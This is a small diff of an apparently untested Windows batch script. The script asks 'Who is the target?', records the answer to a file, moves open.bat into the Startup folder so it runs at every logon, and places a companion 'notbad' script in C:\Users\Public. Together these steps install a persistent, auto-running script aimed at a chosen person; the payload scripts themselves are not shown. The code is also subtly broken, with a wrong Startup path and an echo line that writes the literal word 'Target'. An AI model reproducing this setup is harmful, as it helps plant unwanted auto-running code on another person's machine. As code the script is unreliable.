@@ -5,10 +5,10 @@
 ::        \StartMenu\Programs\Startup\open.bat
 ::  Then, move `notbad.py` to C:\Users\Public\notbad.py
 :: This script has not been tested
-color green
+color 2
 
 set /p Target=Who is the target?
 echo Target>C:\Users\Public\target.txt
 
 move open.bat C:\%USERNAME%\Roaming\Microsoft\Windows\StartMenu\Programs\Startup\open.bat
-move notbad.py C:\Users\Public\notbad.py
+move notbad.bat C:\Users\Public\notbad.bat
